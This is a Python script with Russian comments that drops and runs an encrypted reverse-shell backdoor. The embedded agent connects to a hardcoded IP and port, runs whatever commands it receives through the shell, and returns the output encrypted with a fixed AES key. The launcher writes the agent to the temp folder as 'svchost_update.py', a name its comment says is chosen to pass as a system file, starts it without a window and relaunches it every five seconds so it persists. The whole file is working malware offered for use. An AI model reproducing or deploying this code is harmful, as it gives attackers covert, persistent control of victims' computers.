import os
import subprocess
import time
import tempfile

# Код нашего Агента (Раньше мы его шифровали, но для сборки оставим так)
AGENT_CODE = """
import socket, subprocess, os, time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PHONE_IP = "192.168.0.26" 
PORT = 4445
KEY = bytes.fromhex("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")

def decrypt(data):
    nonce, ct = data[:12], data[12:]
    return AESGCM(KEY).decrypt(nonce, ct, None)

def encrypt(data):
    nonce = os.urandom(12)
    return nonce + AESGCM(KEY).encrypt(nonce, data, None)

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((PHONE_IP, PORT))
            while True:
                raw = s.recv(4096)
                if not raw: break
                cmd = decrypt(raw).decode('utf-8', errors='ignore').strip()
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                out = (r.stdout + r.stderr).encode()
                if not out.strip(): out = b"[OK]"
                s.send(encrypt(out))
        except Exception:
            time.sleep(3)

if __name__ == "__main__":
    connect()
"""

# Папка Temp
temp_dir = tempfile.gettempdir()
# Маскируем под системный файл
agent_path = os.path.join(temp_dir, "svchost_update.py") 

def restore_and_run():
    # Если файла нет — создаем его
    if not os.path.exists(agent_path):
        with open(agent_path, "w", encoding="utf-8") as f:
            f.write(AGENT_CODE)
    
    # Запускаем Агента скрытно (pythonw — без окна)
    subprocess.Popen(["pythonw", agent_path], shell=True)

if __name__ == "__main__":
    while True:
        restore_and_run()
        time.sleep(5)
